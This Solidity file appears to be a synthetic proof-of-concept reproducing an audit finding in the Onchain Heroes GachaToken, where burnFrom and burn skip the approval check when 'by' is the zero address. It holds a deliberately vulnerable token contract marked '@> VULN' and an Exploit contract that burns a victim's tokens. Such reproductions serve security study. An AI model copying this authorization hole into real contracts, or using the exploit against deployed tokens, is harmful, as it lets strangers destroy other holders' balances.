// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*  Onchain Heroes GachaToken — burnFrom and burn pass a caller-chosen `by`
    into Solady ERC1155 `_burn` (Pashov, OnchainHeroes 2025-01-13, C-01).
    SYNTHETIC, cheatcode-free. The blamed authorization skip is preserved
    verbatim below (@> VULN).

    Root cause: `_burn(address by, ...)` skips the approval check when `by`
    is the zero address. `burnFrom` lets the caller pick `by`. `burn` calls
    `_burn(from, id, amount)`, which forwards `by = address(0)`. Either way
    a stranger debits another holder's Gotcha balance. */

contract Endgame {
    function mint(GachaToken token, address to, uint256 id, uint256 amount) external {
        token.mint(to, id, amount);
    }
}

contract GachaToken {
    mapping(address => mapping(uint256 => uint256)) public balanceOf;
    mapping(address => mapping(address => bool)) public isApprovedForAll;
    address public endgame;
    uint256 public burned;

    error NotMinter();
    error NotOwnerNorApproved();

    constructor(address _endgame) {
        endgame = _endgame;
    }

    function mint(address to, uint256 id, uint256 amount) external {
        if (msg.sender != endgame) revert NotMinter();
        uint256 bal = balanceOf[to][id];
        balanceOf[to][id] = bal + amount;
    }

    /// @dev `by` is caller-controlled.
    /// - If `by` is not the zero address, it must be either `from`,
    ///   or approved to manage the tokens of `from`.
    function burnFrom(address by, address from, uint256 id, uint256 amount) external {
        _burn(by, from, id, amount);
    }

    function burn(address from, uint256 id, uint256 amount) external {
        _burn(from, id, amount);
    }

    /// @dev Equivalent to `_burn(address(0), from, id, amount)`.
    function _burn(address from, uint256 id, uint256 amount) internal {
        _burn(address(0), from, id, amount);
    }

    /// @dev Destroys `amount` of token `id` from `from`.
    /// - If `by` is not the zero address, it must be either `from`,
    ///   or approved to manage the tokens of `from`.
    function _burn(address by, address from, uint256 id, uint256 amount) internal {
        // @> VULN: by == address(0) skips this approval check, so the debit below hits any holder.
        if (by != address(0)) {
            if (by != from && !isApprovedForAll[from][by]) revert NotOwnerNorApproved();
        }
        uint256 bal = balanceOf[from][id];
        balanceOf[from][id] = bal - amount;
        burned = burned + amount;
    }
}

contract Exploit {
    address public constant VICTIM = address(0xBEEF);
    uint256 public constant ID = 1;
    uint256 public constant AMOUNT = 100;

    Endgame public endgame; // CREATE nonce 1
    GachaToken public token; // CREATE nonce 2
    uint256 public beforeMint;
    uint256 public afterMint;
    uint256 public afterBurn;

    constructor() {
        endgame = new Endgame();
        token = new GachaToken(address(endgame));
    }

    function run() external {
        beforeMint = token.balanceOf(VICTIM, ID);
        endgame.mint(token, VICTIM, ID, AMOUNT);
        afterMint = token.balanceOf(VICTIM, ID);
        token.burnFrom(address(0), VICTIM, ID, AMOUNT);
        afterBurn = token.balanceOf(VICTIM, ID);
        require(beforeMint == 0, "holder started empty");
        require(afterMint == AMOUNT, "holder was not credited 100");
        require(afterBurn == 0, "balance did not go to 0");
        require(token.burned() == AMOUNT, "100 tokens not burned");
    }
}
